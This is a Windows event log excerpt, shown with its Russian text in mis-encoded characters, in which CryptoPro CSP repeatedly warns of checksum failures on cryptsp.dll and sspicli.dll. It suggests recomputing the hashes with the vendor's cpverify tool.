            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:07
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:07
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:07
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:08
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:10
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:11
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:13
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:13
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:14
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
